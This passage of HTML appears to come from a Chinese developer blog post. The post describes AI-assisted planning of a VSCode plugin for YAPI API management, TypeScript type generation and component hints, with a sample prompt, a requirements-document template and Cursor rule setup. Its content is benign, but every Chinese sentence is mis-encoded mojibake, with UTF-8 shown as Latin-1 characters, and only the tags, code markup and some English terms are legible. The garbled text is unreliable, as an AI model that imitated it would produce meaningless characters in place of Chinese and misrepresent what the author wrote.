<li><strong>å®ç°æ­¥éª¤è§„åˆ’</strong>ï¼šåŸºäºéœ€æ±‚åˆ†æä¸æŠ€æœ¯æ–¹æ¡ˆï¼Œå°†åŠŸèƒ½æ‹†è§£ä¸ºå¯æ‰§è¡Œä»»åŠ¡ï¼Œå®‰æ’åˆé€‚çš„å¼€å‘æµç¨‹ã€‚</li>
</ol>
<h5 data-id="heading-6">1.2.2ã€é˜¶æ®µäºŒï¼šäººå·¥ä¸»å¯¼ã€AIÂ è¾…åŠ©ï¼ˆå®æ–½ä¸éªŒè¯é˜¶æ®µï¼‰</h5>
<p>æœ¬é˜¶æ®µçš„æ ¸å¿ƒç›®æ ‡æ˜¯<strong>é«˜è´¨é‡è½åœ°æ–¹æ¡ˆå¹¶æå‡ç ”å‘æ•ˆç‡</strong>ï¼Œç”±äººå·¥ä¸»å¯¼è®¾è®¡ä¸å†³ç­–ï¼ŒAIÂ ä½œä¸ºæ•ˆç‡å·¥å…·å‚ä¸æ‰§è¡Œå±‚é¢å·¥ä½œã€‚</p>
<ol>
<li><strong>ç¼–ç å®ç°</strong>ï¼šäººå·¥æ ¹æ®æ—¢å®šçš„å®ç°æ­¥éª¤ä¸æŠ€æœ¯æ–¹æ¡ˆï¼Œä¸»å¯¼æ ¸å¿ƒé€»è¾‘ä¸å…³é”®æ¨¡å—çš„å¼€å‘ã€‚
<ul>
<li>AIÂ è¾…åŠ©å®Œæˆä»¥ä¸‹å·¥ä½œï¼š
<ul>
<li>é‡å¤æ€§ä»£ç æˆ–æ ·æ¿ä»£ç ç”Ÿæˆ</li>
<li>ä»£ç ç»“æ„æ•´ç†ä¸å¯è¯»æ€§ä¼˜åŒ–</li>
<li>å¸¸è§é—®é¢˜æ’æŸ¥ä¸å®ç°å»ºè®®æä¾›</li>
</ul>
</li>
</ul>
</li>
<li><strong>åŠŸèƒ½æµ‹è¯•</strong>ï¼šåŠŸèƒ½å¼€å‘å®Œæˆåï¼Œè¿›è¡Œç³»ç»Ÿæ€§çš„æµ‹è¯•ä¸éªŒè¯ã€‚</li>
</ol>
<h5 data-id="heading-7">ä¸ºä»€ä¹ˆé˜¶æ®µäºŒï¼Œä¸äº¤ç»™Â AIÂ æ¥å®Œæˆä¸»è¦çš„å¼€å‘å·¥ä½œå‘¢ï¼Ÿ</h5>
<p>å°½ç®¡Â AIÂ åœ¨ä»£ç ç”Ÿæˆä¸å®ç°å±‚é¢å·²ç»å…·å¤‡ä¸€å®šèƒ½åŠ›ï¼Œä½†åœ¨å½“å‰é˜¶æ®µï¼Œä»ä¸é€‚åˆä½œä¸ºä¼ä¸šçº§é¡¹ç›®çš„ä¸»è¦å¼€å‘ä¸»ä½“ï¼ŒåŸå› ä¸»è¦åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š</p>
<p><strong>1ã€ä¼ä¸šçº§æ’ä»¶å¯¹ç¨³å®šæ€§ä¸å¯ç»´æŠ¤æ€§çš„è¦æ±‚æ›´é«˜</strong></p>
<p>è¯¥æ’ä»¶å±äºä¼ä¸šå†…éƒ¨é•¿æœŸä½¿ç”¨çš„å·¥å…·ï¼Œè€Œéä¸€æ¬¡æ€§æˆ–ä¸ªäººæ€§è´¨é¡¹ç›®ã€‚åœ¨æ­¤ç±»åœºæ™¯ä¸‹ï¼Œä»£ç ä¸ä»…éœ€è¦â€œå¯è¿è¡Œâ€ï¼Œæ›´éœ€è¦å…·å¤‡ï¼š</p>
<ul>
<li>æ¸…æ™°çš„ç»“æ„ä¸ä¸€è‡´çš„è®¾è®¡é£æ ¼</li>
<li>å¯é¢„æµ‹çš„è¡Œä¸ºä¸æ˜ç¡®çš„è¾¹ç•Œçº¦æŸ</li>
<li>ä¾¿äºåç»­ç»´æŠ¤ã€æ‰©å±•ä¸äº¤æ¥çš„å·¥ç¨‹è´¨é‡</li>
</ul>
<p>è¿™äº›èƒ½åŠ›ç›®å‰ä»é«˜åº¦ä¾èµ–äººå·¥ç»éªŒä¸æ•´ä½“æ¶æ„æŠŠæ§ï¼Œéš¾ä»¥å®Œå…¨äº¤ç”±Â AIÂ è‡ªåŠ¨å®Œæˆ</p>
<p><strong>2ã€AIÂ ç”Ÿæˆä»£ç çš„è´¨é‡ä¸ä¸€è‡´æ€§ä»å­˜åœ¨ä¸ç¡®å®šæ€§</strong></p>
<p>ç°é˜¶æ®µÂ AIÂ å¤„äºå¿«é€Ÿæ¼”è¿›é˜¶æ®µï¼Œç”Ÿæˆä»£ç åœ¨ä»¥ä¸‹æ–¹é¢å­˜åœ¨å®¢è§‚é£é™©ï¼š</p>
<ul>
<li>å®ç°æ–¹å¼ä¸ç»Ÿä¸€ï¼Œé£æ ¼å’Œè§„èŒƒéš¾ä»¥é•¿æœŸä¿æŒä¸€è‡´</li>
<li>å¯¹ä¸šåŠ¡ä¸Šä¸‹æ–‡ç†è§£ä¸å®Œæ•´ï¼Œå®¹æ˜“å¼•å…¥éšæ€§é€»è¾‘é—®é¢˜</li>
<li>å¯¹è¾¹ç•Œæ¡ä»¶ã€å¼‚å¸¸å¤„ç†å’Œæç«¯åœºæ™¯è¦†ç›–ä¸è¶³</li>
</ul>
<p>è¿™äº›é—®é¢˜åœ¨çŸ­æœŸå†…å¯èƒ½ä¸æ˜æ˜¾ï¼Œä½†ä¼šæ˜¾è‘—å¢åŠ åç»­ç»´æŠ¤å’ŒäºŒæ¬¡å¼€å‘æˆæœ¬</p>
<p><strong>3ã€å¼€å‘è¿‡ç¨‹æœ¬èº«æ˜¯å›¢é˜Ÿèƒ½åŠ›å»ºè®¾çš„é‡è¦ç»„æˆéƒ¨åˆ†</strong></p>
<p>å¯¹äºå›¢é˜Ÿè€Œè¨€ï¼Œå¼€å‘ä¸ä»…æ˜¯äº¤ä»˜ç»“æœçš„è¿‡ç¨‹ï¼Œä¹Ÿæ˜¯ï¼š</p>
<ul>
<li>æ²‰æ·€ä¸šåŠ¡ç†è§£ä¸æŠ€æœ¯ç»éªŒ</li>
<li>æå‡ç³»ç»Ÿè®¾è®¡ä¸é—®é¢˜æ‹†è§£èƒ½åŠ›</li>
<li>åŸ¹å…»å¯¹ç³»ç»Ÿå…¨å±€çš„æŒæ§èƒ½åŠ›</li>
</ul>
<p>å¦‚æœæ ¸å¿ƒå¼€å‘å·¥ä½œå®Œå…¨äº¤ç”±Â AIÂ æ‰§è¡Œï¼Œå°†å‰Šå¼±å›¢é˜Ÿå¯¹ä»£ç å’Œç³»ç»Ÿçš„â€œæ‰€æœ‰æƒâ€å’Œç†è§£æ·±åº¦ï¼Œé•¿æœŸæ¥çœ‹ä¸åˆ©äºæŠ€æœ¯èƒ½åŠ›çš„ç§¯ç´¯</p>
<p><strong>4ã€è´£ä»»å½’å±ä¸é£é™©æ§åˆ¶éœ€è¦æ˜ç¡®çš„äººå·¥ä¸»ä½“</strong></p>
<p>åœ¨ä¼ä¸šç¯å¢ƒä¸­ï¼Œä»£ç è´¨é‡ã€ç³»ç»Ÿç¨³å®šæ€§å’Œå®‰å…¨é£é™©æœ€ç»ˆéƒ½éœ€è¦ç”±å…·ä½“å›¢é˜Ÿå’Œè´£ä»»äººæ‰¿æ‹…ã€‚</p>
<p>å½“å‰é˜¶æ®µï¼Œç”±äººå·¥ä¸»å¯¼å…³é”®å¼€å‘å†³ç­–ä¸å®ç°ï¼Œæ›´æœ‰åˆ©äºï¼š</p>
<ul>
<li>æ˜ç¡®é—®é¢˜è´£ä»»è¾¹ç•Œ</li>
<li>å¿«é€Ÿå®šä½ä¸ä¿®å¤ç¼ºé™·</li>
<li>åœ¨å‡ºç°é£é™©æ—¶è¿›è¡Œå¯æ§è°ƒæ•´</li>
</ul>
<h4 data-id="heading-8">1.3ã€æ’ä»¶èƒ½åŠ›è§„åˆ’ï¼ˆéœ€æ±‚åˆ†æï¼‰</h4>
<p>åœ¨æ˜ç¡®äº†Â APIÂ ç®¡ç†ä¸ç»„ä»¶ä½¿ç”¨ä¸Šçš„æ ¸å¿ƒç—›ç‚¹ä¹‹åï¼Œæˆ‘ä»¬å¹¶æœªç«‹å³è¿›è¡ŒåŠŸèƒ½è®¾è®¡ï¼Œè€Œæ˜¯å…ˆå°†é—®é¢˜è¿›ä¸€æ­¥æŠ½è±¡ï¼Œå€ŸåŠ©Â AIÂ è®©å…¶ä»æ›´é«˜çš„è§†è§’ç»™å‡ºå¯è¡Œçš„è§£å†³æ–¹æ¡ˆã€‚</p>
<p>åœ¨å®è·µä¸­æˆ‘ä»¬å‘ç°ï¼ŒAIÂ åœ¨ä¿¡æ¯çš„æ•´åˆã€éœ€æ±‚æ‹†è§£å’Œæ–¹æ¡ˆå‘æ•£ä¸Šå…·æœ‰å¾ˆæ˜æ˜¾çš„ä¼˜åŠ¿ã€‚å› æ­¤ï¼Œåœ¨è§„åˆ’æˆ‘ä»¬çš„äº§å“æ—¶ï¼Œä¸€ä¸ªå…³é”®çš„å‰ææ˜¯ï¼š</p>
<p>å°†è‡ªå·±çš„é—®é¢˜æè¿°æ¸…æ¥šï¼Œè€Œæ˜¯ä¸æ˜¯æ€¥äºè®©Â AIÂ ç»™å‡ºç­”æ¡ˆã€‚</p>
<h5 data-id="heading-9">1.3.1ã€AIÂ è¾…åŠ©è§„åˆ’éœ€æ±‚åˆ†æ</h5>
<p>åœ¨ä½¿ç”¨Â AIÂ è§„åˆ’æ’ä»¶èƒ½åŠ›æ—¶ï¼Œä½ åº”è¯¥å…ˆå°†è‡ªå·±çš„ä¸šåŠ¡èƒŒæ™¯ä¸ç—›ç‚¹æŠ›ç»™å®ƒï¼Œå¼•å¯¼Â AIÂ è¿›ä¸€æ­¥è§£æä½ çš„éœ€æ±‚ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä»¥ä¸‹æç¤ºè¯ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">æˆ‘æƒ³è®¾è®¡å¹¶å¼€å‘ä¸€æ¬¾VSCodeæ’ä»¶ï¼Œç”¨äºè§£å†³ä¼ä¸šå†…éƒ¨APIç®¡ç†éš¾é¢˜ï¼Œè§£å†³å‰ç«¯å¼€å‘åœ¨è·å–APIä¿¡æ¯ä¸Šçš„ç¹çï¼Œéš¾ç‚¹å¦‚ä¸‹ï¼š

<span class="hljs-bullet">1.</span> æ¥å£æ¥æºäº YAPI å¹³å°ä¸­ï¼Œå¼€å‘éœ€è¦åå¤æ ¸å¯¹(æ¥å£æ›´æ–°åéœ€è¦äººä¸ºä¿®æ”¹ç­‰)
<span class="hljs-bullet">2.</span> ç±»å‹ç»´æŠ¤å›°éš¾ï¼Œé¡¹ç›®æ™®éä½¿ç”¨ TypeScript æ¥ä¿è¯ç±»å‹å®‰å…¨ï¼Œæ¯æ¬¡æ¥å…¥æ–°æ¥å£ã€è°ƒæ•´å­—æ®µç»“æ„æ—¶ï¼Œæˆ‘ä»¬éƒ½éœ€è¦æ‰‹åŠ¨è¡¥å……/ä¿®æ”¹å¯¹åº”çš„è¯·æ±‚ä¸å“åº”ç±»å‹
<span class="hljs-bullet">3.</span> å†…éƒ¨ç»„ä»¶åº“æ–‡æ¡£æŸ¥è¯¢é¢‘ç¹ï¼Œå¼€å‘è€…é€šå¸¸éœ€è¦ä¸€è¾¹æ’°å†™ä»£ç ï¼Œä¸€è¾¹æŸ¥è¯¢ç»„ä»¶API

æ ¹æ®ä»¥ä¸Šå†…å®¹ï¼Œæ•´ç†ä¸€ä»½éœ€æ±‚åˆ†ææ–‡æ¡£ã€‚
</code></pre>
<p>è¿™é‡Œçš„å…³é”®å¹¶ä¸åœ¨äºæç¤ºè¯æœ¬èº«æ˜¯å¦â€œé«˜çº§â€ï¼Œè€Œåœ¨äºï¼šæç¤ºè¯æ˜¯å¦å®Œæ•´å¹¶è¯¦ç»†è¿˜åŸäº†å¼€å‘åœºæ™¯ä¸‹çš„é—®é¢˜ä¸çº¦æŸã€‚åªæœ‰åœ¨è¾“å…¥è¶³å¤Ÿæ¸…æ™°ã€å…·ä½“çš„å‰æä¸‹ï¼ŒAIÂ æ‰èƒ½ç»™å‡ºçœŸæ­£æœ‰ä»·å€¼çš„åˆ†æç»“æœã€‚</p>
<blockquote>
<p>âš ï¸æç¤ºï¼šå½“ä½ å€ŸåŠ©Â AIÂ å®Œæˆä¸€ä¸ªä»Â 0Â åˆ°Â 1Â çš„å·¥ç¨‹æ—¶ï¼Œåº”è¯¥å…ˆä»ä¸€ä¸ªæœ€å°å¯è¡Œäº§å“ï¼ˆ<code>MVP</code>ï¼‰å¼€å§‹ã€‚</p>
</blockquote>
<p>åœ¨æ„å»ºå·¥å…·ç±»äº§å“æ—¶ï¼Œæœ€å…³é”®çš„ä¸æ˜¯ä¸€æ¬¡æ€§å®ç°æ‰€æœ‰èƒ½åŠ›ï¼Œè€Œæ˜¯å…ˆæ‰“é€ èƒ½è·‘é€šæ ¸å¿ƒä»·å€¼é“¾è·¯çš„Â MVPï¼šéªŒè¯æ€è·¯æ˜¯å¦æˆç«‹ã€æŠ€æœ¯è·¯çº¿æ˜¯å¦å¯è¡Œã€ä½¿ç”¨ä½“éªŒæ˜¯å¦ç¬¦åˆé¢„æœŸã€‚åªæœ‰å½“æœ€å°ç‰ˆæœ¬ç¨³å®šåï¼Œå†é€æ­¥æ‰©å±•åŠŸèƒ½ï¼Œæ‰èƒ½é¿å…è¿‡åº¦è®¾è®¡å’Œæ— æ•ˆæŠ•å…¥ï¼Œè®©æ•´ä¸ªå·¥ç¨‹ä¿æŒæ¸…æ™°ã€å¯æ§å’Œé«˜è´¨é‡è¿­ä»£ã€‚</p>
<blockquote>
<p>âš ï¸å»ºè®®ï¼šéœ€æ±‚åˆ†æä»¥åŠç›¸å…³è®¾è®¡æ–‡æ¡£ä¸­ä¸åº”åŒ…å«ä»£ç å®ç°æˆ–å…·ä½“æŠ€æœ¯ç»†èŠ‚ï¼Œæ–‡æ¡£å†…å®¹åº”é‡ç‚¹æè¿°éœ€æ±‚ç›®æ ‡ã€è®¾è®¡æ€è·¯å’Œä¸šåŠ¡ä»·å€¼ã€‚ï¼ˆå³ä½¿æ˜¯æŠ€æœ¯æ–¹æ¡ˆæ–‡æ¡£ä¸­ä¹Ÿåº”è¯¥è¿™æ ·è§„èŒƒï¼‰</p>
</blockquote>
<h5 data-id="heading-10">1.3.2ã€éœ€æ±‚åˆ†ææ€»ç»“</h5>
<blockquote>
<p>AIÂ ç»™å‡ºçš„ç»“è®ºå¹¶ä¸ç­‰åŒäºæœ€ç»ˆæ–¹æ¡ˆï¼Œå…¶è¾“å‡ºç»“æœæ—¢ä¸èƒ½ä¿è¯æ˜¯æœ€ä¼˜è§£ï¼Œä¹Ÿä¸ä¸€å®šå®Œå…¨æ­£ç¡®ã€‚å°¤å…¶åœ¨éœ€æ±‚åˆ†æä¸æŠ€æœ¯æ–¹æ¡ˆè®¾è®¡ç­‰é˜¶æ®µï¼ŒAIÂ æ›´é€‚åˆä½œä¸ºè¾…åŠ©å†³ç­–å·¥å…·ï¼Œè€Œéç»“è®ºæ¥æºã€‚å¼€å‘è€…ä»éœ€ä¿æŒå¿…è¦çš„åˆ¤æ–­ä¸æ ¡éªŒæ„è¯†ï¼Œç»“åˆå®é™…ä¸šåŠ¡èƒŒæ™¯ä¸å·¥ç¨‹çº¦æŸï¼Œå¯¹Â AIÂ çš„è¾“å‡ºè¿›è¡Œå–èˆä¸ä¿®æ­£ã€‚ç›¸å…³æ–‡æ¡£ä¹Ÿä¸å¯èƒ½ä¸€æ¬¡æˆå‹ï¼Œé€šå¸¸éœ€è¦åœ¨å®è·µè¿‡ç¨‹ä¸­ä¸æ–­è¿­ä»£ä¸å®Œå–„ã€‚</p>
</blockquote>
<p>ä»¥æœ¬æ¬¡éœ€æ±‚åˆ†æä¸ºä¾‹ï¼Œåœ¨åŸºäºæç¤ºè¯ç”Ÿæˆçš„â€œç•Œé¢è®¾è®¡è¦ç‚¹â€ä¸­ï¼Œä¾¿è¯†åˆ«å‡ºéœ€è¦è°ƒæ•´çš„åœ°æ–¹ï¼šå¯¹äºä¼ä¸šå†…éƒ¨é¡¹ç›®è€Œè¨€ï¼Œæ’ä»¶é€šå¸¸ç”±å¤šäººåä½œå¼€å‘å’Œé•¿æœŸç»´æŠ¤ï¼Œç›¸å…³é…ç½®ç†åº”å…·å¤‡å¯å…±äº«æ€§å’Œä¸€è‡´æ€§ï¼Œå› æ­¤æ›´é€‚åˆä»¥é¡¹ç›®çº§é…ç½®çš„å½¢å¼å­˜åœ¨ï¼Œå¹¶éšé¡¹ç›®æµè½¬.</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da3876e625984dbfa2f17ea1d5b7c40a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=zxPANmj%2F%2F%2FLnVwfAUqWomca0%2B4c%3D" alt="image.png" loading="lazy"/></p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å°†é—®é¢˜ä¹ŸæŠ›ç»™AIï¼Œè®©å®ƒä¿®æ”¹ä¸€ä¸‹ç•Œé¢äº¤äº’ã€‚</p>
<pre><code class="hljs language-markdown" lang="markdown">@docs/éœ€æ±‚åˆ†ææ–‡æ¡£.md:61-80 è¿™é‡Œçš„ç•Œé¢è®¾è®¡ä¸åˆç†ï¼Œé¡¹ç›®ç”±å¤šäººè¿›è¡Œå¼€å‘ç»´æŠ¤ï¼Œé…ç½®éœ€è¦å¯ä»¥å…±äº«ï¼Œé‚£ä¹ˆå°±ä¸åº”è¯¥ä½œä¸ºæ’ä»¶çš„é¢æ¿è®¾ç½®ï¼Œè€Œæ˜¯åº”è¯¥æ˜¯é¡¹ç›®çº§çš„ï¼Œè·Ÿéšé¡¹ç›®æ¥èµ°
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aee7fe9217b74ddf88831a31251b109f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=jhpnp8w%2FkluuSk%2FyVc8xuxe1WVA%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨æ­¤åŸºç¡€ä¸Šï¼Œå€ŸåŠ©Â AIÂ å¯¹é—®é¢˜çš„å½’çº³å’Œèƒ½åŠ›æŠ½è±¡ï¼Œæˆ‘ä»¬é€æ­¥æ˜ç¡®äº†ä¸€ä¸ªå¯è½åœ°ã€å¯è¿­ä»£çš„æ’ä»¶èƒ½åŠ›æ–¹å‘ï¼Œå¹¶ä»¥æ­¤ä¸ºåŸºç¡€è¿›è¡Œäº†åŠŸèƒ½è§„åˆ’ä¸åç»­å·¥ç¨‹å®ç°ã€‚</p>
<p><strong>æœ€ç»ˆæ’ä»¶çš„æ ¸å¿ƒèƒ½åŠ›èšç„¦åœ¨ä¸‰å¤§æ¨¡å—</strong>ï¼š</p>
<ul>
<li><strong>ä¸€é”®æ‹‰å–Â YAPI</strong>Â 
<ul>
<li>è‡ªåŠ¨ç”ŸæˆÂ <code>TS</code>Â ç±»å‹ï¼ˆæ ¸å¿ƒï¼‰</li>
<li>æ¥å£ç±»å‹æ›´æ–°æç¤ºï¼ˆæ ¸å¿ƒï¼‰</li>
</ul>
</li>
<li><strong>ç»„ä»¶Â APIÂ æ™ºèƒ½æç¤º</strong>
<ul>
<li>å±æ€§è¡¥å…¨</li>
<li>æ‚¬æµ®æç¤º</li>
<li>è‡ªåŠ¨åŒ–æµç¨‹ï¼šè‡ªåŠ¨è·å–ç»„ä»¶æ•°æ®æº</li>
</ul>
</li>
<li><strong>é’‰é’‰é€šçŸ¥æ•´åˆ</strong>
<ul>
<li>å¼‚å¸¸ã€åé¦ˆä¿¡æ¯å®æ—¶æ¨é€</li>
</ul>
</li>
</ul>
<h5 data-id="heading-11">1.3.3ã€éœ€æ±‚åˆ†ææ–‡æ¡£æ¨¡ç‰ˆ</h5>
<p>è¿™é‡Œç»™å‡ºæˆ‘æ‰€æ¨èçš„ä¸€ä¸ªéœ€æ±‚åˆ†ææ–‡æ¡£çš„æ ¼å¼ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒå€Ÿé‰´ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># äº§å“åç§°</span>

<span class="hljs-section">## 1ã€é¡¹ç›®èƒŒæ™¯</span>
ç®€å•ä»‹ç»ä¸€ä¸‹é¡¹ç›®çš„èƒŒæ™¯ä¸ç—›ç‚¹ï¼Œä»¥åŠæœŸæœ›è§£å†³çš„é—®é¢˜æˆ–è€…è¾¾åˆ°çš„æ•ˆæœã€‚

<span class="hljs-section">## 2ã€ç›®æ ‡ç”¨æˆ·</span>

| ç”¨æˆ·ç±»å‹ | ä½¿ç”¨åœºæ™¯ |
|---------|---------|
| å‰ç«¯å¼€å‘äººå‘˜ | å¼€å‘è¿‡ç¨‹æ—¶xxx |
| æµ‹è¯•äººå‘˜ | æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹æ—¶éœ€è¦xxx |
| äº§å“ç»ç† | æ¼”ç¤ºäº§å“åŠŸèƒ½æ—¶éœ€è¦xxx |
| æ—¥å¸¸åŠå…¬äººå‘˜ | å¤„ç†xxx |

<span class="hljs-section">## 3ã€æ ¸å¿ƒåŠŸèƒ½éœ€æ±‚</span>

ä»‹ç»ä¸€ä¸‹é¡¹ç›®æƒ³è¦å®ç°çš„å„ä¸ªåŠŸèƒ½ç‚¹ï¼Œä»¥åŠç›¸å…³çš„æè¿°ç­‰ä¿¡æ¯

<span class="hljs-section">### 3.1ã€åŠŸèƒ½æ¦‚è§ˆ</span>

<span class="hljs-section">### 3.2ã€åŠŸèƒ½è¯´æ˜</span>

...

<span class="hljs-section">## 4ã€ç•Œé¢è®¾è®¡è¦ç‚¹</span>

æœ¬èŠ‚ç”¨äºæè¿°ä¸»è¦ç•Œé¢å½¢æ€ä¸äº¤äº’ç»“æ„ï¼Œä¸è¦æ±‚æœ€ç»ˆ UI è®¾è®¡ç¨¿ï¼Œå¯é€šè¿‡ç»“æ„ç¤ºæ„å¸®åŠ©ç†è§£åŠŸèƒ½å¸ƒå±€

\<span class="hljs-code">`\`</span>\`markdown
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ğŸ¬ APIç®¡ç†å·¥å…·                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ğŸ“‹ æ¥å£åˆ—è¡¨                        â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚
â”‚  â”‚ ğŸ“ æµ‹è¯•æ¥å£1                    â”‚â”‚
â”‚  â”‚    /example/form               â”‚â”‚
â”‚  â”‚    2024-01-15 10:30            â”‚â”‚
â”‚  â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚
â”‚  â”‚ ğŸ“ æµ‹è¯•æ¥å£2                    â”‚â”‚
â”‚  â”‚    /example/login              â”‚â”‚
â”‚  â”‚    2024-01-14 16:20            â”‚â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜â”‚
â”‚                                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
\<span class="hljs-code">`\`</span>\`
ç»“æ„å›¾ä»…ç”¨äºè¾…åŠ©ç†è§£ï¼Œä¸ä½œä¸ºæœ€ç»ˆäº¤ä»˜ç‰©

<span class="hljs-section">## 5ã€æŠ€æœ¯çº¦æŸä¸é™åˆ¶</span>

ä»éœ€æ±‚å±‚é¢è¯´æ˜å¯èƒ½å­˜åœ¨çš„é™åˆ¶æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šä½¿ç”¨ç¯å¢ƒé™åˆ¶ï¼ˆä»…é™æŸäº›ç¼–è¾‘å™¨æˆ–å¹³å°ï¼‰ã€æ•°æ®æ¥æºä¾èµ–ã€æƒé™æˆ–å®‰å…¨ç›¸å…³çº¦æŸ

æœ¬èŠ‚ä¸æ¶‰åŠå…·ä½“æŠ€æœ¯æ–¹æ¡ˆæˆ–å®ç°æ–¹å¼ã€‚

<span class="hljs-section">## 6ã€åç»­è¿­ä»£æ–¹å‘</span>

æè¿°å¯èƒ½çš„åç»­æ¼”è¿›æ–¹å‘ï¼Œç”¨äºè¾…åŠ©å†³ç­–ä¸è§„åˆ’ï¼šåŠŸèƒ½å¢å¼ºæ–¹å‘ã€ç”¨æˆ·ä½“éªŒä¼˜åŒ–æ–¹å‘ã€ä¸å…¶ä»–å·¥å…·æˆ–ç³»ç»Ÿçš„è”åŠ¨å¯èƒ½æ€§

æœ¬èŠ‚å†…å®¹ä¸ä¸€å®šå¯è¡Œï¼Œéœ€åœ¨åç»­é˜¶æ®µè¯„ä¼°å¯è¡Œæ€§

<span class="hljs-section">## 7ã€å…¶ä»–è¯´æ˜</span>
ä¾‹å¦‚ï¼Œä¸“ä¸šæœ¯è¯­ã€ä¿®è®¢çš„è®°å½•ç­‰ç­‰
</code></pre>
<h5 data-id="heading-12">1.3.4ã€è§„åˆ™å®šåˆ¶è§„èŒƒÂ AIÂ è¾“å‡º</h5>
<p>AIç¼–è¾‘å™¨<code>Cursor</code>ã€<code>Trae</code>ç­‰å¯ä»¥é€šè¿‡å®šåˆ¶è§„åˆ™ï¼Œè®©Â AIÂ çš„è¾“å‡ºæ›´ç¬¦åˆç”¨æˆ·çš„ä¸ªæ€§åŒ–è¦æ±‚ã€‚é€šè¿‡å®šåˆ¶è§„åˆ™ï¼Œè®©Â AIÂ çš„å›ç­”ä»¥æˆ‘ä»¬æƒ³è¦çš„æ¨¡ç‰ˆè¾“å‡ºã€‚</p>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcursor.com%2Fcn%2Fdocs%2Fcontext%2Frules%23cursor" target="_blank" title="https://cursor.com/cn/docs/context/rules#cursor" ref="nofollow noopener noreferrer">cursor.com/cn/docs/conâ€¦</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.trae.cn%2Fide%2Frules" target="_blank" title="https://docs.trae.cn/ide/rules" ref="nofollow noopener noreferrer">docs.trae.cn/ide/rules:Â â€¦</a></p>
</li>
</ul>
<p>è¿™é‡Œä»¥<code>Cursor</code>ä¸ºä¾‹ï¼š</p>
<p><strong>ï¼ˆ1ï¼‰åˆ›å»ºè§„åˆ™æ–‡ä»¶</strong></p>
<p>æ‰“å¼€Â <code>Cursor</code>Â è®¾ç½®</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4c8d5efff64a41b7b3ce1acb0710a80b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=mk7GLgDdeqd4%2BOe1m6kcV5NTL8w%3D" alt="image.png" loading="lazy"/></p>
<p>è¿›å…¥è§„åˆ™é¢æ¿ï¼Œæ‰¾åˆ°é¡¹ç›®è§„åˆ™ï¼Œç‚¹å‡»<code>AddÂ Rule</code>æ–°å¢è§„åˆ™ï¼Œé€‰æ‹©è‡ªå®šä¹‰è§„åˆ™</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ac06660a0c71491885eb22da0bf93607~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=wfO6kgueMT1jLNOUSHVD9cKvF80%3D" alt="image.png" loading="lazy"/></p>
<p>è¾“å…¥åˆæ³•çš„è§„åˆ™åç§°åï¼Œå›è½¦åˆ›å»ºï¼Œå³å¯åœ¨æ ¹ç›®å½•ä¸‹çœ‹åˆ°è§„åˆ™æ–‡ä»¶</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0ae57180c41483fada22b8f0cae7998~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pS_6YeH5LqR5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478873&amp;x-signature=KOD59ufnMfCGkXitWz6crXZEfqc%3D" alt="image.png" loading="lazy"/></p>
